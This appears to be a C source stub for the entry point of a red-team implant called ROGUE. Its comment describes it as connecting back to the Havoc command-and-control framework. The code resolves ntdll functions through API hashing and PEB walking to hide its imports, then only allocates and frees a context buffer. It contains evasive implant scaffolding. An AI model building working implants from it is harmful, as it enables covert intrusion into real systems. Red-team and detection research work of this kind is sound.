/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryVirtualMemory );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* API Hashes */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * 'Main' logic and tasking loop. Connects back
 * to Havoc.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	API				Api;

	PROGUE_CTX			Ctx = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* API Table */
	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY ); 
	Api.RtlAllocateHeap      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	/* Create a buffer to hold the rogue context */
	if ( ( Ctx = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( ROGUE_CTX ) ) ) != NULL ) {
		/* 'Free' the memory block for the rogue context */
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Abort! */
	return;
};
